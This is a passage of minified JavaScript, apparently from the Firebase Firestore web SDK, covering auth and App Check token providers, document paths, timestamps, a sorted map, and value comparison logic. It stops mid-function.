II{constructor(e,t){this.user=t,this.type="OAuth",this.headers=new Map,this.headers.set("Authorization",`Bearer ${e}`)}}class r5{getToken(){return Promise.resolve(null)}invalidateToken(){}start(e,t){e.enqueueRetryable((()=>t(Vt.UNAUTHENTICATED)))}shutdown(){}}class l5{constructor(e){this.token=e,this.changeListener=null}getToken(){return Promise.resolve(this.token)}invalidateToken(){}start(e,t){this.changeListener=t,e.enqueueRetryable((()=>t(this.token.user)))}shutdown(){this.changeListener=null}}class c5{constructor(e){this.t=e,this.currentUser=Vt.UNAUTHENTICATED,this.i=0,this.forceRefresh=!1,this.auth=null}start(e,t){Aa(this.o===void 0,42304);let n=this.i;const i=d=>this.i!==n?(n=this.i,t(d)):Promise.resolve();let r=new Ws;this.o=()=>{this.i++,this.currentUser=this.u(),r.resolve(),r=new Ws,e.enqueueRetryable((()=>i(this.currentUser)))};const l=()=>{const d=r;e.enqueueRetryable((async()=>{await d.promise,await i(this.currentUser)}))},u=d=>{De("FirebaseAuthCredentialsProvider","Auth detected"),this.auth=d,this.o&&(this.auth.addAuthTokenListener(this.o),l())};this.t.onInit((d=>u(d))),setTimeout((()=>{if(!this.auth){const d=this.t.getImmediate({optional:!0});d?u(d):(De("FirebaseAuthCredentialsProvider","Auth not yet detected"),r.resolve(),r=new Ws)}}),0),l()}getToken(){const e=this.i,t=this.forceRefresh;return this.forceRefresh=!1,this.auth?this.auth.getToken(t).then((n=>this.i!==e?(De("FirebaseAuthCredentialsProvider","getToken aborted due to token change."),this.getToken()):n?(Aa(typeof n.accessToken=="string",31837,{l:n}),new II(n.accessToken,this.currentUser)):null)):Promise.resolve(null)}invalidateToken(){this.forceRefresh=!0}shutdown(){this.auth&&this.o&&this.auth.removeAuthTokenListener(this.o),this.o=void 0}u(){const e=this.auth&&this.auth.getUid();return Aa(e===null||typeof e=="string",2055,{h:e}),new Vt(e)}}class u5{constructor(e,t,n){this.P=e,this.T=t,this.I=n,this.type="FirstParty",this.user=Vt.FIRST_PARTY,this.R=new Map}A(){return this.I?this.I():null}get headers(){this.R.set("X-Goog-AuthUser",this.P);const e=this.A();return e&&this.R.set("Authorization",e),this.T&&this.R.set("X-Goog-Iam-Authorization-Token",this.T),this.R}}class d5{constructor(e,t,n){this.P=e,this.T=t,this.I=n}getToken(){return Promise.resolve(new u5(this.P,this.T,this.I))}start(e,t){e.enqueueRetryable((()=>t(Vt.FIRST_PARTY)))}shutdown(){}invalidateToken(){}}class FA{constructor(e){this.value=e,this.type="AppCheck",this.headers=new Map,e&&e.length>0&&this.headers.set("x-firebase-appcheck",this.value)}}class p5{constructor(e,t){this.V=t,this.forceRefresh=!1,this.appCheck=null,this.m=null,this.p=null,wn(e)&&e.settings.appCheckToken&&(this.p=e.settings.appCheckToken)}start(e,t){Aa(this.o===void 0,3512);const n=r=>{r.error!=null&&De("FirebaseAppCheckTokenProvider",`Error getting App Check token; using placeholder token instead. Error: ${r.error.message}`);const l=r.token!==this.m;return this.m=r.token,De("FirebaseAppCheckTokenProvider",`Received ${l?"new":"existing"} token.`),l?t(r.token):Promise.resolve()};this.o=r=>{e.enqueueRetryable((()=>n(r)))};const i=r=>{De("FirebaseAppCheckTokenProvider","AppCheck detected"),this.appCheck=r,this.o&&this.appCheck.addTokenListener(this.o)};this.V.onInit((r=>i(r))),setTimeout((()=>{if(!this.appCheck){const r=this.V.getImmediate({optional:!0});r?i(r):De("FirebaseAppCheckTokenProvider","AppCheck not yet detected")}}),0)}getToken(){if(this.p)return Promise.resolve(new FA(this.p));const e=this.forceRefresh;return this.forceRefresh=!1,this.appCheck?this.appCheck.getToken(e).then((t=>t?(Aa(typeof t.token=="string",44558,{tokenResult:t}),this.m=t.token,new FA(t.token)):null)):Promise.resolve(null)}invalidateToken(){this.forceRefresh=!0}shutdown(){this.appCheck&&this.o&&this.appCheck.removeTokenListener(this.o),this.o=void 0}}function m5(a){const e=typeof self<"u"&&(self.crypto||self.msCrypto),t=new Uint8Array(a);if(e&&typeof e.getRandomValues=="function")e.getRandomValues(t);else for(let n=0;n<a;n++)t[n]=Math.floor(256*Math.random());return t}class bE{static newId(){const e="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",t=62*Math.floor(4.129032258064516);let n="";for(;n.length<20;){const i=m5(40);for(let r=0;r<i.length;++r)n.length<20&&i[r]<t&&(n+=e.charAt(i[r]%62))}return n}}function da(a,e){return a<e?-1:a>e?1:0}function $y(a,e){const t=Math.min(a.length,e.length);for(let n=0;n<t;n++){const i=a.charAt(n),r=e.charAt(n);if(i!==r)return Vv(i)===Vv(r)?da(i,r):Vv(i)?1:-1}return da(a.length,e.length)}const f5=55296,h5=57343;function Vv(a){const e=a.charCodeAt(0);return e>=f5&&e<=h5}function wc(a,e,t){return a.length===e.length&&a.every(((n,i)=>t(n,e[i])))}const VA="__name__";class eo{constructor(e,t,n){t===void 0?t=0:t>e.length&&Ge(637,{offset:t,range:e.length}),n===void 0?n=e.length-t:n>e.length-t&&Ge(1746,{length:n,range:e.length-t}),this.segments=e,this.offset=t,this.len=n}get length(){return this.len}isEqual(e){return eo.comparator(this,e)===0}child(e){const t=this.segments.slice(this.offset,this.limit());return e instanceof eo?e.forEach((n=>{t.push(n)})):t.push(e),this.construct(t)}limit(){return this.offset+this.length}popFirst(e){return e=e===void 0?1:e,this.construct(this.segments,this.offset+e,this.length-e)}popLast(){return this.construct(this.segments,this.offset,this.length-1)}firstSegment(){return this.segments[this.offset]}lastSegment(){return this.get(this.length-1)}get(e){return this.segments[this.offset+e]}isEmpty(){return this.length===0}isPrefixOf(e){if(e.length<this.length)return!1;for(let t=0;t<this.length;t++)if(this.get(t)!==e.get(t))return!1;return!0}isImmediateParentOf(e){if(this.length+1!==e.length)return!1;for(let t=0;t<this.length;t++)if(this.get(t)!==e.get(t))return!1;return!0}forEach(e){for(let t=this.offset,n=this.limit();t<n;t++)e(this.segments[t])}toArray(){return this.segments.slice(this.offset,this.limit())}static comparator(e,t){const n=Math.min(e.length,t.length);for(let i=0;i<n;i++){const r=eo.compareSegments(e.get(i),t.get(i));if(r!==0)return r}return da(e.length,t.length)}static compareSegments(e,t){const n=eo.isNumericId(e),i=eo.isNumericId(t);return n&&!i?-1:!n&&i?1:n&&i?eo.extractNumericId(e).compare(eo.extractNumericId(t)):$y(e,t)}static isNumericId(e){return e.startsWith("__id")&&e.endsWith("__")}static extractNumericId(e){return Js.fromString(e.substring(4,e.length-2))}}class Qa extends eo{construct(e,t,n){return new Qa(e,t,n)}canonicalString(){return this.toArray().join("/")}toString(){return this.canonicalString()}toUriEncodedString(){return this.toArray().map(encodeURIComponent).join("/")}static fromString(...e){const t=[];for(const n of e){if(n.indexOf("//")>=0)throw new ke(Se.INVALID_ARGUMENT,`Invalid segment (${n}). Paths must not contain // in them.`);t.push(...n.split("/").filter((i=>i.length>0)))}return new Qa(t)}static emptyPath(){return new Qa([])}}const g5=/^[_a-zA-Z][_a-zA-Z0-9]*$/;class Ot extends eo{construct(e,t,n){return new Ot(e,t,n)}static isValidIdentifier(e){return g5.test(e)}canonicalString(){return this.toArray().map((e=>(e=e.replace(/\\/g,"\\\\").replace(/`/g,"\\`"),Ot.isValidIdentifier(e)||(e="`"+e+"`"),e))).join(".")}toString(){return this.canonicalString()}isKeyField(){return this.length===1&&this.get(0)===VA}static keyField(){return new Ot([VA])}static fromServerFormat(e){const t=[];let n="",i=0;const r=()=>{if(n.length===0)throw new ke(Se.INVALID_ARGUMENT,`Invalid field path (${e}). Paths must not be empty, begin with '.', end with '.', or contain '..'`);t.push(n),n=""};let l=!1;for(;i<e.length;){const u=e[i];if(u==="\\"){if(i+1===e.length)throw new ke(Se.INVALID_ARGUMENT,"Path has trailing escape character: "+e);const d=e[i+1];if(d!=="\\"&&d!=="."&&d!=="`")throw new ke(Se.INVALID_ARGUMENT,"Path has invalid escape sequence: "+e);n+=d,i+=2}else u==="`"?(l=!l,i++):u!=="."||l?(n+=u,i++):(r(),i++)}if(r(),l)throw new ke(Se.INVALID_ARGUMENT,"Unterminated ` in path: "+e);return new Ot(t)}static emptyPath(){return new Ot([])}}class Be{constructor(e){this.path=e}static fromPath(e){return new Be(Qa.fromString(e))}static fromName(e){return new Be(Qa.fromString(e).popFirst(5))}static empty(){return new Be(Qa.emptyPath())}get collectionGroup(){return this.path.popLast().lastSegment()}hasCollectionId(e){return this.path.length>=2&&this.path.get(this.path.length-2)===e}getCollectionGroup(){return this.path.get(this.path.length-2)}getCollectionPath(){return this.path.popLast()}isEqual(e){return e!==null&&Qa.comparator(this.path,e.path)===0}toString(){return this.path.toString()}static comparator(e,t){return Qa.comparator(e.path,t.path)}static isDocumentKey(e){return e.length%2==0}static fromSegments(e){return new Be(new Qa(e.slice()))}}function b5(a,e,t){if(!t)throw new ke(Se.INVALID_ARGUMENT,`Function ${a}() cannot be called with an empty ${e}.`)}function v5(a,e,t,n){if(e===!0&&n===!0)throw new ke(Se.INVALID_ARGUMENT,`${a} and ${t} cannot be used together.`)}function HA(a){if(!Be.isDocumentKey(a))throw new ke(Se.INVALID_ARGUMENT,`Invalid document reference. Document references must have an even number of segments, but ${a} has ${a.length}.`)}function wI(a){return typeof a=="object"&&a!==null&&(Object.getPrototypeOf(a)===Object.prototype||Object.getPrototypeOf(a)===null)}function vE(a){if(a===void 0)return"undefined";if(a===null)return"null";if(typeof a=="string")return a.length>20&&(a=`${a.substring(0,20)}...`),JSON.stringify(a);if(typeof a=="number"||typeof a=="boolean")return""+a;if(typeof a=="object"){if(a instanceof Array)return"an array";{const e=(function(n){return n.constructor?n.constructor.name:null})(a);return e?`a custom ${e} object`:"an object"}}return typeof a=="function"?"a function":Ge(12329,{type:typeof a})}function Ks(a,e){if("_delegate"in a&&(a=a._delegate),!(a instanceof e)){if(e.name===a.constructor.name)throw new ke(Se.INVALID_ARGUMENT,"Type does not match the expected instance. Did you pass a reference from a different Firestore SDK?");{const t=vE(a);throw new ke(Se.INVALID_ARGUMENT,`Expected type '${e.name}', but it was: ${t}`)}}return a}function ft(a,e){const t={typeString:a};return e&&(t.value=e),t}function yp(a,e){if(!wI(a))throw new ke(Se.INVALID_ARGUMENT,"JSON must be an object");let t;for(const n in e)if(e[n]){const i=e[n].typeString,r="value"in e[n]?{value:e[n].value}:void 0;if(!(n in a)){t=`JSON missing required field: '${n}'`;break}const l=a[n];if(i&&typeof l!==i){t=`JSON field '${n}' must be a ${i}.`;break}if(r!==void 0&&l!==r.value){t=`Expected '${n}' field to equal '${r.value}'`;break}}if(t)throw new ke(Se.INVALID_ARGUMENT,t);return!0}const GA=-62135596800,QA=1e6;class Ua{static now(){return Ua.fromMillis(Date.now())}static fromDate(e){return Ua.fromMillis(e.getTime())}static fromMillis(e){const t=Math.floor(e/1e3),n=Math.floor((e-1e3*t)*QA);return new Ua(t,n)}constructor(e,t){if(this.seconds=e,this.nanoseconds=t,t<0)throw new ke(Se.INVALID_ARGUMENT,"Timestamp nanoseconds out of range: "+t);if(t>=1e9)throw new ke(Se.INVALID_ARGUMENT,"Timestamp nanoseconds out of range: "+t);if(e<GA)throw new ke(Se.INVALID_ARGUMENT,"Timestamp seconds out of range: "+e);if(e>=253402300800)throw new ke(Se.INVALID_ARGUMENT,"Timestamp seconds out of range: "+e)}toDate(){return new Date(this.toMillis())}toMillis(){return 1e3*this.seconds+this.nanoseconds/QA}_compareTo(e){return this.seconds===e.seconds?da(this.nanoseconds,e.nanoseconds):da(this.seconds,e.seconds)}isEqual(e){return e.seconds===this.seconds&&e.nanoseconds===this.nanoseconds}toString(){return"Timestamp(seconds="+this.seconds+", nanoseconds="+this.nanoseconds+")"}toJSON(){return{type:Ua._jsonSchemaVersion,seconds:this.seconds,nanoseconds:this.nanoseconds}}static fromJSON(e){if(yp(e,Ua._jsonSchema))return new Ua(e.seconds,e.nanoseconds)}valueOf(){const e=this.seconds-GA;return String(e).padStart(12,"0")+"."+String(this.nanoseconds).padStart(9,"0")}}Ua._jsonSchemaVersion="firestore/timestamp/1.0",Ua._jsonSchema={type:ft("string",Ua._jsonSchemaVersion),seconds:ft("number"),nanoseconds:ft("number")};class Ke{static fromTimestamp(e){return new Ke(e)}static min(){return new Ke(new Ua(0,0))}static max(){return new Ke(new Ua(253402300799,999999999))}constructor(e){this.timestamp=e}compareTo(e){return this.timestamp._compareTo(e.timestamp)}isEqual(e){return this.timestamp.isEqual(e.timestamp)}toMicroseconds(){return 1e6*this.timestamp.seconds+this.timestamp.nanoseconds/1e3}toString(){return"SnapshotVersion("+this.timestamp.toString()+")"}toTimestamp(){return this.timestamp}}const $d=-1;function y5(a,e){const t=a.toTimestamp().seconds,n=a.toTimestamp().nanoseconds+1,i=Ke.fromTimestamp(n===1e9?new Ua(t+1,0):new Ua(t,n));return new $s(i,Be.empty(),e)}function E5(a){return new $s(a.readTime,a.key,$d)}class $s{constructor(e,t,n){this.readTime=e,this.documentKey=t,this.largestBatchId=n}static min(){return new $s(Ke.min(),Be.empty(),$d)}static max(){return new $s(Ke.max(),Be.empty(),$d)}}function S5(a,e){let t=a.readTime.compareTo(e.readTime);return t!==0?t:(t=Be.comparator(a.documentKey,e.documentKey),t!==0?t:da(a.largestBatchId,e.largestBatchId))}const C5="The current tab is not in the required state to perform this operation. It might be necessary to refresh the browser tab.";class T5{constructor(){this.onCommittedListeners=[]}addOnCommittedListener(e){this.onCommittedListeners.push(e)}raiseOnCommittedEvent(){this.onCommittedListeners.forEach((e=>e()))}}async function Vc(a){if(a.code!==Se.FAILED_PRECONDITION||a.message!==C5)throw a;De("LocalStore","Unexpectedly lost primary lease")}class ve{constructor(e){this.nextCallback=null,this.catchCallback=null,this.result=void 0,this.error=void 0,this.isDone=!1,this.callbackAttached=!1,e((t=>{this.isDone=!0,this.result=t,this.nextCallback&&this.nextCallback(t)}),(t=>{this.isDone=!0,this.error=t,this.catchCallback&&this.catchCallback(t)}))}catch(e){return this.next(void 0,e)}next(e,t){return this.callbackAttached&&Ge(59440),this.callbackAttached=!0,this.isDone?this.error?this.wrapFailure(t,this.error):this.wrapSuccess(e,this.result):new ve(((n,i)=>{this.nextCallback=r=>{this.wrapSuccess(e,r).next(n,i)},this.catchCallback=r=>{this.wrapFailure(t,r).next(n,i)}}))}toPromise(){return new Promise(((e,t)=>{this.next(e,t)}))}wrapUserFunction(e){try{const t=e();return t instanceof ve?t:ve.resolve(t)}catch(t){return ve.reject(t)}}wrapSuccess(e,t){return e?this.wrapUserFunction((()=>e(t))):ve.resolve(t)}wrapFailure(e,t){return e?this.wrapUserFunction((()=>e(t))):ve.reject(t)}static resolve(e){return new ve(((t,n)=>{t(e)}))}static reject(e){return new ve(((t,n)=>{n(e)}))}static waitFor(e){return new ve(((t,n)=>{let i=0,r=0,l=!1;e.forEach((u=>{++i,u.next((()=>{++r,l&&r===i&&t()}),(d=>n(d)))})),l=!0,r===i&&t()}))}static or(e){let t=ve.resolve(!1);for(const n of e)t=t.next((i=>i?ve.resolve(i):n()));return t}static forEach(e,t){const n=[];return e.forEach(((i,r)=>{n.push(t.call(this,i,r))})),this.waitFor(n)}static mapArray(e,t){return new ve(((n,i)=>{const r=e.length,l=new Array(r);let u=0;for(let d=0;d<r;d++){const p=d;t(e[p]).next((f=>{l[p]=f,++u,u===r&&n(l)}),(f=>i(f)))}}))}static doWhile(e,t){return new ve(((n,i)=>{const r=()=>{e()===!0?t().next((()=>{r()}),i):n()};r()}))}}function x5(a){const e=a.match(/Android ([\d.]+)/i),t=e?e[1].split(".").slice(0,2).join("."):"-1";return Number(t)}function Hc(a){return a.name==="IndexedDbTransactionError"}class Jh{constructor(e,t){this.previousValue=e,t&&(t.sequenceNumberHandler=n=>this.ae(n),this.ue=n=>t.writeSequenceNumber(n))}ae(e){return this.previousValue=Math.max(e,this.previousValue),this.previousValue}next(){const e=++this.previousValue;return this.ue&&this.ue(e),e}}Jh.ce=-1;const yE=-1;function Wh(a){return a==null}function ch(a){return a===0&&1/a==-1/0}function A5(a){return typeof a=="number"&&Number.isInteger(a)&&!ch(a)&&a<=Number.MAX_SAFE_INTEGER&&a>=Number.MIN_SAFE_INTEGER}const jI="";function P5(a){let e="";for(let t=0;t<a.length;t++)e.length>0&&(e=JA(e)),e=L5(a.get(t),e);return JA(e)}function L5(a,e){let t=e;const n=a.length;for(let i=0;i<n;i++){const r=a.charAt(i);switch(r){case"\0":t+="";break;case jI:t+="";break;default:t+=r}}return t}function JA(a){return a+jI+""}function WA(a){let e=0;for(const t in a)Object.prototype.hasOwnProperty.call(a,t)&&e++;return e}function dl(a,e){for(const t in a)Object.prototype.hasOwnProperty.call(a,t)&&e(t,a[t])}function DI(a){for(const e in a)if(Object.prototype.hasOwnProperty.call(a,e))return!1;return!0}class Wa{constructor(e,t){this.comparator=e,this.root=t||kt.EMPTY}insert(e,t){return new Wa(this.comparator,this.root.insert(e,t,this.comparator).copy(null,null,kt.BLACK,null,null))}remove(e){return new Wa(this.comparator,this.root.remove(e,this.comparator).copy(null,null,kt.BLACK,null,null))}get(e){let t=this.root;for(;!t.isEmpty();){const n=this.comparator(e,t.key);if(n===0)return t.value;n<0?t=t.left:n>0&&(t=t.right)}return null}indexOf(e){let t=0,n=this.root;for(;!n.isEmpty();){const i=this.comparator(e,n.key);if(i===0)return t+n.left.size;i<0?n=n.left:(t+=n.left.size+1,n=n.right)}return-1}isEmpty(){return this.root.isEmpty()}get size(){return this.root.size}minKey(){return this.root.minKey()}maxKey(){return this.root.maxKey()}inorderTraversal(e){return this.root.inorderTraversal(e)}forEach(e){this.inorderTraversal(((t,n)=>(e(t,n),!1)))}toString(){const e=[];return this.inorderTraversal(((t,n)=>(e.push(`${t}:${n}`),!1))),`{${e.join(", ")}}`}reverseTraversal(e){return this.root.reverseTraversal(e)}getIterator(){return new gf(this.root,null,this.comparator,!1)}getIteratorFrom(e){return new gf(this.root,e,this.comparator,!1)}getReverseIterator(){return new gf(this.root,null,this.comparator,!0)}getReverseIteratorFrom(e){return new gf(this.root,e,this.comparator,!0)}}class gf{constructor(e,t,n,i){this.isReverse=i,this.nodeStack=[];let r=1;for(;!e.isEmpty();)if(r=t?n(e.key,t):1,t&&i&&(r*=-1),r<0)e=this.isReverse?e.left:e.right;else{if(r===0){this.nodeStack.push(e);break}this.nodeStack.push(e),e=this.isReverse?e.right:e.left}}getNext(){let e=this.nodeStack.pop();const t={key:e.key,value:e.value};if(this.isReverse)for(e=e.left;!e.isEmpty();)this.nodeStack.push(e),e=e.right;else for(e=e.right;!e.isEmpty();)this.nodeStack.push(e),e=e.left;return t}hasNext(){return this.nodeStack.length>0}peek(){if(this.nodeStack.length===0)return null;const e=this.nodeStack[this.nodeStack.length-1];return{key:e.key,value:e.value}}}class kt{constructor(e,t,n,i,r){this.key=e,this.value=t,this.color=n??kt.RED,this.left=i??kt.EMPTY,this.right=r??kt.EMPTY,this.size=this.left.size+1+this.right.size}copy(e,t,n,i,r){return new kt(e??this.key,t??this.value,n??this.color,i??this.left,r??this.right)}isEmpty(){return!1}inorderTraversal(e){return this.left.inorderTraversal(e)||e(this.key,this.value)||this.right.inorderTraversal(e)}reverseTraversal(e){return this.right.reverseTraversal(e)||e(this.key,this.value)||this.left.reverseTraversal(e)}min(){return this.left.isEmpty()?this:this.left.min()}minKey(){return this.min().key}maxKey(){return this.right.isEmpty()?this.key:this.right.maxKey()}insert(e,t,n){let i=this;const r=n(e,i.key);return i=r<0?i.copy(null,null,null,i.left.insert(e,t,n),null):r===0?i.copy(null,t,null,null,null):i.copy(null,null,null,null,i.right.insert(e,t,n)),i.fixUp()}removeMin(){if(this.left.isEmpty())return kt.EMPTY;let e=this;return e.left.isRed()||e.left.left.isRed()||(e=e.moveRedLeft()),e=e.copy(null,null,null,e.left.removeMin(),null),e.fixUp()}remove(e,t){let n,i=this;if(t(e,i.key)<0)i.left.isEmpty()||i.left.isRed()||i.left.left.isRed()||(i=i.moveRedLeft()),i=i.copy(null,null,null,i.left.remove(e,t),null);else{if(i.left.isRed()&&(i=i.rotateRight()),i.right.isEmpty()||i.right.isRed()||i.right.left.isRed()||(i=i.moveRedRight()),t(e,i.key)===0){if(i.right.isEmpty())return kt.EMPTY;n=i.right.min(),i=i.copy(n.key,n.value,null,null,i.right.removeMin())}i=i.copy(null,null,null,null,i.right.remove(e,t))}return i.fixUp()}isRed(){return this.color}fixUp(){let e=this;return e.right.isRed()&&!e.left.isRed()&&(e=e.rotateLeft()),e.left.isRed()&&e.left.left.isRed()&&(e=e.rotateRight()),e.left.isRed()&&e.right.isRed()&&(e=e.colorFlip()),e}moveRedLeft(){let e=this.colorFlip();return e.right.left.isRed()&&(e=e.copy(null,null,null,null,e.right.rotateRight()),e=e.rotateLeft(),e=e.colorFlip()),e}moveRedRight(){let e=this.colorFlip();return e.left.left.isRed()&&(e=e.rotateRight(),e=e.colorFlip()),e}rotateLeft(){const e=this.copy(null,null,kt.RED,null,this.right.left);return this.right.copy(null,null,this.color,e,null)}rotateRight(){const e=this.copy(null,null,kt.RED,this.left.right,null);return this.left.copy(null,null,this.color,null,e)}colorFlip(){const e=this.left.copy(null,null,!this.left.color,null,null),t=this.right.copy(null,null,!this.right.color,null,null);return this.copy(null,null,!this.color,e,t)}checkMaxDepth(){const e=this.check();return Math.pow(2,e)<=this.size+1}check(){if(this.isRed()&&this.left.isRed())throw Ge(43730,{key:this.key,value:this.value});if(this.right.isRed())throw Ge(14113,{key:this.key,value:this.value});const e=this.left.check();if(e!==this.right.check())throw Ge(27949);return e+(this.isRed()?0:1)}}kt.EMPTY=null,kt.RED=!0,kt.BLACK=!1;kt.EMPTY=new class{constructor(){this.size=0}get key(){throw Ge(57766)}get value(){throw Ge(16141)}get color(){throw Ge(16727)}get left(){throw Ge(29726)}get right(){throw Ge(36894)}copy(e,t,n,i,r){return this}insert(e,t,n){return new kt(e,t)}remove(e,t){return this}isEmpty(){return!0}inorderTraversal(e){return!1}reverseTraversal(e){return!1}minKey(){return null}maxKey(){return null}isRed(){return!1}checkMaxDepth(){return!0}check(){return 0}};class Et{constructor(e){this.comparator=e,this.data=new Wa(this.comparator)}has(e){return this.data.get(e)!==null}first(){return this.data.minKey()}last(){return this.data.maxKey()}get size(){return this.data.size}indexOf(e){return this.data.indexOf(e)}forEach(e){this.data.inorderTraversal(((t,n)=>(e(t),!1)))}forEachInRange(e,t){const n=this.data.getIteratorFrom(e[0]);for(;n.hasNext();){const i=n.getNext();if(this.comparator(i.key,e[1])>=0)return;t(i.key)}}forEachWhile(e,t){let n;for(n=t!==void 0?this.data.getIteratorFrom(t):this.data.getIterator();n.hasNext();)if(!e(n.getNext().key))return}firstAfterOrEqual(e){const t=this.data.getIteratorFrom(e);return t.hasNext()?t.getNext().key:null}getIterator(){return new KA(this.data.getIterator())}getIteratorFrom(e){return new KA(this.data.getIteratorFrom(e))}add(e){return this.copy(this.data.remove(e).insert(e,!0))}delete(e){return this.has(e)?this.copy(this.data.remove(e)):this}isEmpty(){return this.data.isEmpty()}unionWith(e){let t=this;return t.size<e.size&&(t=e,e=this),e.forEach((n=>{t=t.add(n)})),t}isEqual(e){if(!(e instanceof Et)||this.size!==e.size)return!1;const t=this.data.getIterator(),n=e.data.getIterator();for(;t.hasNext();){const i=t.getNext().key,r=n.getNext().key;if(this.comparator(i,r)!==0)return!1}return!0}toArray(){const e=[];return this.forEach((t=>{e.push(t)})),e}toString(){const e=[];return this.forEach((t=>e.push(t))),"SortedSet("+e.toString()+")"}copy(e){const t=new Et(this.comparator);return t.data=e,t}}class KA{constructor(e){this.iter=e}getNext(){return this.iter.getNext().key}hasNext(){return this.iter.hasNext()}}class bi{constructor(e){this.fields=e,e.sort(Ot.comparator)}static empty(){return new bi([])}unionWith(e){let t=new Et(Ot.comparator);for(const n of this.fields)t=t.add(n);for(const n of e)t=t.add(n);return new bi(t.toArray())}covers(e){for(const t of this.fields)if(t.isPrefixOf(e))return!0;return!1}isEqual(e){return wc(this.fields,e.fields,((t,n)=>t.isEqual(n)))}}class MI extends Error{constructor(){super(...arguments),this.name="Base64DecodeError"}}class Ut{constructor(e){this.binaryString=e}static fromBase64String(e){const t=(function(i){try{return atob(i)}catch(r){throw typeof DOMException<"u"&&r instanceof DOMException?new MI("Invalid base64 string: "+r):r}})(e);return new Ut(t)}static fromUint8Array(e){const t=(function(i){let r="";for(let l=0;l<i.length;++l)r+=String.fromCharCode(i[l]);return r})(e);return new Ut(t)}[Symbol.iterator](){let e=0;return{next:()=>e<this.binaryString.length?{value:this.binaryString.charCodeAt(e++),done:!1}:{value:void 0,done:!0}}}toBase64(){return(function(t){return btoa(t)})(this.binaryString)}toUint8Array(){return(function(t){const n=new Uint8Array(t.length);for(let i=0;i<t.length;i++)n[i]=t.charCodeAt(i);return n})(this.binaryString)}approximateByteSize(){return 2*this.binaryString.length}compareTo(e){return da(this.binaryString,e.binaryString)}isEqual(e){return this.binaryString===e.binaryString}}Ut.EMPTY_BYTE_STRING=new Ut("");const R5=new RegExp(/^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d(?:\.(\d+))?Z$/);function Xs(a){if(Aa(!!a,39018),typeof a=="string"){let e=0;const t=R5.exec(a);if(Aa(!!t,46558,{timestamp:a}),t[1]){let i=t[1];i=(i+"000000000").substr(0,9),e=Number(i)}const n=new Date(a);return{seconds:Math.floor(n.getTime()/1e3),nanos:e}}return{seconds:at(a.seconds),nanos:at(a.nanos)}}function at(a){return typeof a=="number"?a:typeof a=="string"?Number(a):0}function Zs(a){return typeof a=="string"?Ut.fromBase64String(a):Ut.fromUint8Array(a)}const NI="server_timestamp",_I="__type__",qI="__previous_value__",kI="__local_write_time__";function EE(a){return(a?.mapValue?.fields||{})[_I]?.stringValue===NI}function Kh(a){const e=a.mapValue.fields[qI];return EE(e)?Kh(e):e}function Xd(a){const e=Xs(a.mapValue.fields[kI].timestampValue);return new Ua(e.seconds,e.nanos)}class I5{constructor(e,t,n,i,r,l,u,d,p,f,h){this.databaseId=e,this.appId=t,this.persistenceKey=n,this.host=i,this.ssl=r,this.forceLongPolling=l,this.autoDetectLongPolling=u,this.longPollingOptions=d,this.useFetchStreams=p,this.isUsingEmulator=f,this.apiKey=h}}const uh="(default)";class Zd{constructor(e,t){this.projectId=e,this.database=t||uh}static empty(){return new Zd("","")}get isDefaultDatabase(){return this.database===uh}isEqual(e){return e instanceof Zd&&e.projectId===this.projectId&&e.database===this.database}}function w5(a,e){if(!Object.prototype.hasOwnProperty.apply(a.options,["projectId"]))throw new ke(Se.INVALID_ARGUMENT,'"projectId" not provided in firebase.initializeApp.');return new Zd(a.options.projectId,e)}const OI="__type__",j5="__max__",bf={mapValue:{}},UI="__vector__",dh="value";function er(a){return"nullValue"in a?0:"booleanValue"in a?1:"integerValue"in a||"doubleValue"in a?2:"timestampValue"in a?3:"stringValue"in a?5:"bytesValue"in a?6:"referenceValue"in a?7:"geoPointValue"in a?8:"arrayValue"in a?9:"mapValue"in a?EE(a)?4:M5(a)?9007199254740991:D5(a)?10:11:Ge(28295,{value:a})}function lo(a,e){if(a===e)return!0;const t=er(a);if(t!==er(e))return!1;switch(t){case 0:case 9007199254740991:return!0;case 1:return a.booleanValue===e.booleanValue;case 4:return Xd(a).isEqual(Xd(e));case 3:return(function(i,r){if(typeof i.timestampValue=="string"&&typeof r.timestampValue=="string"&&i.timestampValue.length===r.timestampValue.length)return i.timestampValue===r.timestampValue;const l=Xs(i.timestampValue),u=Xs(r.timestampValue);return l.seconds===u.seconds&&l.nanos===u.nanos})(a,e);case 5:return a.stringValue===e.stringValue;case 6:return(function(i,r){return Zs(i.bytesValue).isEqual(Zs(r.bytesValue))})(a,e);case 7:return a.referenceValue===e.referenceValue;case 8:return(function(i,r){return at(i.geoPointValue.latitude)===at(r.geoPointValue.latitude)&&at(i.geoPointValue.longitude)===at(r.geoPointValue.longitude)})(a,e);case 2:return(function(i,r){if("integerValue"in i&&"integerValue"in r)return at(i.integerValue)===at(r.integerValue);if("doubleValue"in i&&"doubleValue"in r){const l=at(i.doubleValue),u=at(r.doubleValue);return l===u?ch(l)===ch(u):isNaN(l)&&isNaN(u)}return!1})(a,e);case 9:return wc(a.arrayValue.values||[],e.arrayValue.values||[],lo);case 10:case 11:return(function(i,r){const l=i.mapValue.fields||{},u=r.mapValue.fields||{};if(WA(l)!==WA(u))return!1;for(const d in l)if(l.hasOwnProperty(d)&&(u[d]===void 0||!lo(l[d],u[d])))return!1;return!0})(a,e);default:return Ge(52216,{left:a})}}function ep(a,e){return(a.values||[]).find((t=>lo(t,e)))!==void 0}function jc(a,e){if(a===e)return 0;const t=er(a),n=er(e);if(t!==n)return da(t,n);switch(t){case 0:case 9007199254740991:return 0;case 1:return da(a.booleanValue,e.booleanValue);case 2:return(function(r,l){const u=at(r.integerValue||r.doubleValue),d=at(l.integerValue||l.doubleValue);return u<d?-1:u>d?1:u===d?0:isNaN(u)?isNaN(d)?0:-1:1})(a,e);case 3:return YA(a.timestampValue,e.timestampValue);case 4:return YA(Xd(a),Xd(e));case 5:return $y(a.stringValue,e.stringValue);case 6:return(function(r,l){const u=Zs(r),d=Zs(l);return u.compareTo(d)})(a.bytesValue,e.bytesValue);case 7:return(function(r,l){const u=r.split("/"),d=l.split("/");for(let p=0;p<u.length&&p<d.length;p++){const f=da(u[p],d[p]);if(f!==0)return f}return da(u.length,d.length)})(a.referenceValue,e.referenceValue);case 8:return(function(r,l){const u=da(at(r.latitude),at(l.latitude));return u!==0?u:da(at(r.longitude),at(l.longitude))})(a.geoPointValue,e.geoPointValue);case 9:return $A(a.arrayValue,e.arrayValue);case 10:return(function(r,l){const 